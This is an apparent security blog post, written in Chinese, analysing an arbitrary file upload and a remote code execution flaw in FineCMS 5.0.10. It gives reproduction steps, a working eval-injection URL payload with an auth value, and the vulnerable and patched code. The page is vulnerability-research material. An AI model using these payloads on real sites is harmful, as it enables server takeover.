<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Finecms 5.0.10 Multiple vulnerability analysis - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>Finecms 5.0.10 Multiple vulnerability analysis</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">
<div class="container text-center mt-3">
    <iframe src="https://duckduckgo.com/search.html?site=https://getshe11.com/&prefill=" style="overflow:hidden;margin:0;padding:0;max-width:80%;height:40px;" frameborder="0"></iframe>
</div>
</div>
<div class="meta">
  <div>2018-11-07 14:30</div>
  <div>
    <span><a href="https://getshe11.com/tags/finecms/">#Finecms</a></span>
      </div>
  </div>
<div class="content">
  <h1 id="0x01-前言">0x01 前言</h1>
<p>已经一个月没有写文章了，最近发生了很多事情，之前的每日一洞、每周一洞，到现在的每月一洞了。感觉去审计多了就好比如去刷题，但是我觉得应该做一个系统化的学习.
今天的这个CMS是FineCMS，版本是5.0.10版本的几个漏洞分析，从修补漏洞前和修补后的两方面去分析。</p>
<h1 id="0x02-环境搭建">0x02 环境搭建</h1>
<p><a href="https://www.ichunqiu.com/vm/59011/1">https://www.ichunqiu.com/vm/59011/1</a> 可以去I春秋的实验，不用自己搭建那么麻烦了。</p>
<h1 id="0x03-任意文件上传漏洞">0x03 任意文件上传漏洞</h1>
<h2 id="1漏洞复现">1.漏洞复现</h2>
<!-- raw HTML omitted -->
<p>用十六进制编辑器写一个有一句话的图片
去网站注册一个账号，然后到上传头像的地方。
抓包，把jepg的改成php发包。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/1.png" alt="">
可以看到文件已经上传到到<code>/uploadfile/member/用户ID/0x0.php</code>
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/2.png" alt=""></p>
<h2 id="2漏洞分析">2.漏洞分析</h2>
<p>文件：<code>finecms/dayrui/controllers/member/Account.php</code> 177~244行</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#e6db74">/**
</span><span style="color:#e6db74"> *  上传头像处理
</span><span style="color:#e6db74"> *  传入头像压缩包，解压到指定文件夹后删除非图片文件
</span><span style="color:#e6db74"> */</span>
<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">upload</span>() {

    <span style="color:#75715e">// 创建图片存储文件夹
</span><span style="color:#75715e"></span>    $dir <span style="color:#f92672">=</span> <span style="color:#a6e22e">SYS_UPLOAD_PATH</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/member/&#39;</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uid</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/&#39;</span>;
    <span style="color:#f92672">@</span><span style="color:#a6e22e">dr_dir_delete</span>($dir);
    <span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($dir) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">dr_mkdirs</span>($dir);

    <span style="color:#66d9ef">if</span> ($_POST[<span style="color:#e6db74">&#39;tx&#39;</span>]) {
        $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;+&#39;</span>, $_POST[<span style="color:#e6db74">&#39;tx&#39;</span>]);
        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^(data:\s*image\/(\w+);base64,)/&#39;</span>, $file, $result)){
            $new_file <span style="color:#f92672">=</span> $dir<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;0x0.&#39;</span><span style="color:#f92672">.</span>$result[<span style="color:#ae81ff">2</span>];
            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!@</span><span style="color:#a6e22e">file_put_contents</span>($new_file, <span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">str_replace</span>($result[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#39;&#39;</span>, $file)))) {
                <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;目录权限不足或磁盘已满&#39;</span>));
            } <span style="color:#66d9ef">else</span> {
                $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">load</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">library</span>(<span style="color:#e6db74">&#39;image_lib&#39;</span>);
                $config[<span style="color:#e6db74">&#39;create_thumb&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">TRUE</span>;
                $config[<span style="color:#e6db74">&#39;thumb_marker&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
                $config[<span style="color:#e6db74">&#39;maintain_ratio&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">FALSE</span>;
                $config[<span style="color:#e6db74">&#39;source_image&#39;</span>] <span style="color:#f92672">=</span> $new_file;
                <span style="color:#66d9ef">foreach</span> (<span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">180</span>) <span style="color:#66d9ef">as</span> $a) {
                    $config[<span style="color:#e6db74">&#39;width&#39;</span>] <span style="color:#f92672">=</span> $config[<span style="color:#e6db74">&#39;height&#39;</span>] <span style="color:#f92672">=</span> $a;
                    $config[<span style="color:#e6db74">&#39;new_image&#39;</span>] <span style="color:#f92672">=</span> $dir<span style="color:#f92672">.</span>$a<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">.</span>$a<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>$result[<span style="color:#ae81ff">2</span>];
                    $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">image_lib</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">initialize</span>($config);
                    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">image_lib</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">resize</span>()) {
                        <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;上传错误：&#39;</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">image_lib</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">display_errors</span>()));
                        <span style="color:#66d9ef">break</span>;
                    }
                }
                <span style="color:#66d9ef">list</span>($width, $height, $type, $attr) <span style="color:#f92672">=</span> <span style="color:#a6e22e">getimagesize</span>($dir<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;45x45.&#39;</span><span style="color:#f92672">.</span>$result[<span style="color:#ae81ff">2</span>]);
                <span style="color:#f92672">!</span>$type <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;图片字符串不规范&#39;</span>));
            }
        } <span style="color:#66d9ef">else</span> {

            <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;图片字符串不规范&#39;</span>));
        }
    } <span style="color:#66d9ef">else</span> {
        <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;图片不存在&#39;</span>));
    }

<span style="color:#75715e">// 上传图片到服务器
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">defined</span>(<span style="color:#e6db74">&#39;UCSSO_API&#39;</span>)) {
        $rt <span style="color:#f92672">=</span> <span style="color:#a6e22e">ucsso_avatar</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uid</span>, <span style="color:#a6e22e">file_get_contents</span>($dir<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;90x90.jpg&#39;</span>));
        <span style="color:#f92672">!</span>$rt[<span style="color:#e6db74">&#39;code&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">fc_lang</span>(<span style="color:#e6db74">&#39;通信失败：%s&#39;</span>, $rt[<span style="color:#e6db74">&#39;msg&#39;</span>]));
    }


    <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#39;1&#39;</span>);
}
</code></pre></div><p>这个我记得在5.0.8的版本有讲过这个代码的漏洞执行https://getpass.cn/2018/01/30/The%20latest%20version%20of%20FineCMS%205.0.8%20getshell%20daily%20two%20holes/</p>
<p>后来官方修复的方案是加上了白名单了：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>(<span style="color:#a6e22e">strtolower</span>($result[<span style="color:#ae81ff">2</span>]), <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;jpg&#39;</span>, <span style="color:#e6db74">&#39;jpeg&#39;</span>, <span style="color:#e6db74">&#39;png&#39;</span>, <span style="color:#e6db74">&#39;gif&#39;</span>))) {
                    <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;目录权限不足&#39;</span>));
                }
                <span style="color:#f92672">...</span>
                 $c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
                    <span style="color:#66d9ef">if</span> ($fp <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">opendir</span>($dir)) {
                        <span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">FALSE</span> <span style="color:#f92672">!==</span> ($file <span style="color:#f92672">=</span> <span style="color:#a6e22e">readdir</span>($fp))) {
                            $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">strrchr</span>($file, <span style="color:#e6db74">&#39;.&#39;</span>), <span style="color:#ae81ff">1</span>);
                            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">in_array</span>(<span style="color:#a6e22e">strtolower</span>($ext), <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;jpg&#39;</span>, <span style="color:#e6db74">&#39;jpeg&#39;</span>, <span style="color:#e6db74">&#39;png&#39;</span>, <span style="color:#e6db74">&#39;gif&#39;</span>))) {
                                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">copy</span>($dir<span style="color:#f92672">.</span>$file, $my<span style="color:#f92672">.</span>$file)) {
                                    $c<span style="color:#f92672">++</span>;
                                }
                            }
                        }
                        <span style="color:#a6e22e">closedir</span>($fp);
                    }
                    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$c) {
                        <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">dr_json</span>(<span style="color:#ae81ff">0</span>,  <span style="color:#a6e22e">fc_lang</span>(<span style="color:#e6db74">&#39;未找到目录中的图片&#39;</span>)));
                    }

</code></pre></div><h1 id="0x04-任意代码执行漏洞">0x04 任意代码执行漏洞</h1>
<h2 id="1漏洞复现-1">1.漏洞复现</h2>
<p><code>auth</code>下面的分析的时候会说到怎么获取</p>
<p>浏览器输入：
<code>http://getpass1.cn/index.php?c=api&amp;m=data2&amp;auth=582f27d140497a9d8f048ca085b111df&amp;param=action=cache%20name=MEMBER.1%27];phpinfo();$a=[%271</code></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/3.png" alt=""></p>
<h2 id="2漏洞分析-1">2.漏洞分析</h2>
<p>这个漏洞的文件在<code>/finecms/dayrui/controllers/Api.php</code>的<code>data2()</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">data2</span>() {
        $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();

        <span style="color:#75715e">// 安全码认证
</span><span style="color:#75715e"></span>        $auth <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;auth&#39;</span>, <span style="color:#66d9ef">true</span>);
        <span style="color:#66d9ef">if</span> ($auth <span style="color:#f92672">!=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">SYS_KEY</span>)) {
            <span style="color:#75715e">// 授权认证码不正确
</span><span style="color:#75715e"></span>            $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;授权认证码不正确&#39;</span>, <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>);
        } <span style="color:#66d9ef">else</span> {
            <span style="color:#75715e">// 解析数据
</span><span style="color:#75715e"></span>            $cache <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
            $param <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;param&#39;</span>);
            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($param[<span style="color:#e6db74">&#39;cache&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $param[<span style="color:#e6db74">&#39;cache&#39;</span>]) {
                $cache <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">dr_array2string</span>($param));
                $data <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get_cache_data</span>($cache);
            }
            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$data) {

                <span style="color:#75715e">// list数据查询
</span><span style="color:#75715e"></span>                $data <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">list_tag</span>($param);
                $data[<span style="color:#e6db74">&#39;code&#39;</span>] <span style="color:#f92672">=</span> $data[<span style="color:#e6db74">&#39;error&#39;</span>] <span style="color:#f92672">?</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>;
                <span style="color:#a6e22e">unset</span>($data[<span style="color:#e6db74">&#39;sql&#39;</span>], $data[<span style="color:#e6db74">&#39;pages&#39;</span>]);

                <span style="color:#75715e">// 缓存数据
</span><span style="color:#75715e"></span>                $cache <span style="color:#f92672">&amp;&amp;</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">set_cache_data</span>($cache, $data, $param[<span style="color:#e6db74">&#39;cache&#39;</span>]);
            }
        }

        <span style="color:#75715e">// 接收参数
</span><span style="color:#75715e"></span>        $format <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;format&#39;</span>);
        $function <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;function&#39;</span>);
        <span style="color:#66d9ef">if</span> ($function) {
            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">function_exists</span>($function)) {
                $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">fc_lang</span>(<span style="color:#e6db74">&#39;自定义函数&#39;</span><span style="color:#f92672">.</span>$function<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;不存在&#39;</span>), <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>);
            } <span style="color:#66d9ef">else</span> {
                $data <span style="color:#f92672">=</span> $function($data);
            }
        }

        <span style="color:#75715e">// 页面输出
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> ($format <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;php&#39;</span>) {
            <span style="color:#a6e22e">print_r</span>($data);
        } <span style="color:#66d9ef">elseif</span> ($format <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;jsonp&#39;</span>) {
            <span style="color:#75715e">// 自定义返回名称
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;callback&#39;</span>, <span style="color:#66d9ef">TRUE</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;(&#39;</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">callback_json</span>($data)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;)&#39;</span>;
        } <span style="color:#66d9ef">else</span> {
            <span style="color:#75715e">// 自定义返回名称
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">callback_json</span>($data);
        }
        <span style="color:#66d9ef">exit</span>;

	}
</code></pre></div><p>可以看到开头这里验证了认证码：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">// 安全码认证
</span><span style="color:#75715e"></span>    $auth <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;auth&#39;</span>, <span style="color:#66d9ef">true</span>);
    <span style="color:#66d9ef">if</span> ($auth <span style="color:#f92672">!=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">SYS_KEY</span>)) {
        <span style="color:#75715e">// 授权认证码不正确
</span><span style="color:#75715e"></span>        $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;授权认证码不正确&#39;</span>, <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>);
    } <span style="color:#66d9ef">else</span> {
</code></pre></div><p>授权码在<code>/config/system.php</code>
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/4.png" alt="">
可以看到<code>SYS_KEY</code>是固定的，我们可以在Cookies找到，<code>/finecms/dayrui/config/config.php</code>
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/5.png" alt="">
用浏览器查看Cookies可以看到KEY，但是验证用MD5，我们先把KEY加密就行了。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/6.png" alt=""></p>
<p>直接看到这一段，调用了<code>Template</code>对象里面的<code>list_tag</code>函数</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$data) {

                <span style="color:#75715e">// list数据查询
</span><span style="color:#75715e"></span>                $data <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">list_tag</span>($param);
                $data[<span style="color:#e6db74">&#39;code&#39;</span>] <span style="color:#f92672">=</span> $data[<span style="color:#e6db74">&#39;error&#39;</span>] <span style="color:#f92672">?</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>;
                <span style="color:#a6e22e">unset</span>($data[<span style="color:#e6db74">&#39;sql&#39;</span>], $data[<span style="color:#e6db74">&#39;pages&#39;</span>]);

                <span style="color:#75715e">// 缓存数据
</span><span style="color:#75715e"></span>                $cache <span style="color:#f92672">&amp;&amp;</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">set_cache_data</span>($cache, $data, $param[<span style="color:#e6db74">&#39;cache&#39;</span>]);
            }
</code></pre></div><p>我们到<code>finecms/dayrui/libraries/Template.php</code>看<code>list_tag</code>函数的代码,代码有点长，我抓重点的地方,这里把<code>param=action=cache%20name=MEMBER.1%27];phpinfo();$a=[%271</code>的内容分为两个数组<code>$var</code>、<code>$val</code>，这两个数组的内容分别为</p>
<pre><code>$var=['action','name']
$val=['cache%20','MEMBER.1%27];phpinfo();$a=[%271']
</code></pre><p><code>$cache=_cache_var</code>是返回会员的信息
重点的是下面的 <code> @eval('$data=$cache'.$this-&gt;_get_var($_param).';');</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">foreach</span> ($params <span style="color:#66d9ef">as</span> $t) {
            $var <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($t, <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">strpos</span>($t, <span style="color:#e6db74">&#39;=&#39;</span>));
            $val <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($t, <span style="color:#a6e22e">strpos</span>($t, <span style="color:#e6db74">&#39;=&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</code></pre></div><p>再看这一段,因为<code>swtich</code>选中的是<code>cache</code>，所有就不再进行下面的分析了。
<code>$pos = strpos($param['name'], '.');</code>这句是为下面的<code>substr</code>函数做准备。
是为了分离出的内容为</p>
<pre><code>$_name='MEMBER'
$_param=&quot;1%27];phpinfo();$a=[%271&quot;
</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> <span style="color:#75715e">// action
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">switch</span> ($system[<span style="color:#e6db74">&#39;action&#39;</span>]) {

            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;cache&#39;</span><span style="color:#f92672">:</span> <span style="color:#75715e">// 系统缓存数据
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($param[<span style="color:#e6db74">&#39;name&#39;</span>])) {
                    <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_return</span>($system[<span style="color:#e6db74">&#39;return&#39;</span>], <span style="color:#e6db74">&#39;name参数不存在&#39;</span>);
                }

                $pos <span style="color:#f92672">=</span> <span style="color:#a6e22e">strpos</span>($param[<span style="color:#e6db74">&#39;name&#39;</span>], <span style="color:#e6db74">&#39;.&#39;</span>);
                <span style="color:#66d9ef">if</span> ($pos <span style="color:#f92672">!==</span> <span style="color:#66d9ef">FALSE</span>) {
                    $_name <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($param[<span style="color:#e6db74">&#39;name&#39;</span>], <span style="color:#ae81ff">0</span>, $pos);
                    $_param <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($param[<span style="color:#e6db74">&#39;name&#39;</span>], $pos <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
                } <span style="color:#66d9ef">else</span> {
                    $_name <span style="color:#f92672">=</span> $param[<span style="color:#e6db74">&#39;name&#39;</span>];
                    $_param <span style="color:#f92672">=</span> <span style="color:#66d9ef">NULL</span>;
                }
                $cache <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_cache_var</span>($_name, <span style="color:#f92672">!</span>$system[<span style="color:#e6db74">&#39;site&#39;</span>] <span style="color:#f92672">?</span> <span style="color:#a6e22e">SITE_ID</span> <span style="color:#f92672">:</span> $system[<span style="color:#e6db74">&#39;site&#39;</span>]);
                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$cache) {
                    <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_return</span>($system[<span style="color:#e6db74">&#39;return&#39;</span>], <span style="color:#e6db74">&#34;缓存(</span><span style="color:#e6db74">{</span>$_name<span style="color:#e6db74">}</span><span style="color:#e6db74">)不存在，请在后台更新缓存&#34;</span>);
                }
                <span style="color:#66d9ef">if</span> ($_param) {
                    $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
                    <span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#39;$data=$cache&#39;</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_get_var</span>($_param)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;;&#39;</span>);
                    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$data) {
                        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_return</span>($system[<span style="color:#e6db74">&#39;return&#39;</span>], <span style="color:#e6db74">&#34;缓存(</span><span style="color:#e6db74">{</span>$_name<span style="color:#e6db74">}</span><span style="color:#e6db74">)参数不存在!!&#34;</span>);
                    }
                } <span style="color:#66d9ef">else</span> {
                    $data <span style="color:#f92672">=</span> $cache;
                }

                <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_return</span>($system[<span style="color:#e6db74">&#39;return&#39;</span>], $data, <span style="color:#e6db74">&#39;&#39;</span>);
                <span style="color:#66d9ef">break</span>;
</code></pre></div><p>跟踪<code>get_var</code>函数，在这里我们先把<code>$param</code>的内容假设为a,然后执行函数里面的内容，最后返回的<code>$string</code>的内容是：
<code>$string=['a']</code>
那么我们的思路就是把两边的[' &lsquo;]闭合然后再放上恶意的代码。
payload为：<code>1'];phpinfo();$a=['1</code>
那么返回的<code>$string</code>的内容：
<code>$string=['1'];phpinfo();$a=['1']</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_get_var</span>($param) {
        $array <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;.&#39;</span>, $param);
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$array) {
            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>;
        }
        $string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
        <span style="color:#66d9ef">foreach</span> ($array <span style="color:#66d9ef">as</span> $var) {
            $string<span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;[&#39;</span>;
            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($var, <span style="color:#e6db74">&#39;$&#39;</span>) <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>) {
                $string<span style="color:#f92672">.=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/\[(.+)\]/U&#39;</span>, <span style="color:#e6db74">&#39;[\&#39;\\1\&#39;]&#39;</span>, $var);
            } <span style="color:#66d9ef">elseif</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/[A-Z_]+/&#39;</span>, $var)) {
                $string<span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>$var<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#39;</span>;
            } <span style="color:#66d9ef">else</span> {
                $string<span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;\&#39;&#39;</span><span style="color:#f92672">.</span>$var<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;\&#39;&#39;</span>;
            }
            $string<span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;]&#39;</span>;
        }

        <span style="color:#66d9ef">return</span> $string;
    }
</code></pre></div><p>修复后的<code>_get_var</code>函数里面多了一个<code>dr_safe_replace</code>过滤函数，然后<code>data2()</code>删除了。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_get_var</span>($param) {

        $array <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;.&#39;</span>, $param);
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$array) {
